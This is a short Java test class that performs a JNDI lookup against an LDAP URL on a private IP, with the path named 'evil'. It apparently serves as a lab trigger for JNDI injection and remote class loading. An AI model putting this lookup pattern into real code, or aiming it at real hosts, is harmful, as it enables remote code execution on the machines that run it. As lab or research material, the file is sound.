package org.springbus.asm;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Twst {

    public static void main(String[] args) throws NamingException {
        Context context = new InitialContext();
        context.lookup("ldap://10.100.163.17:1199/evil");
    }

}
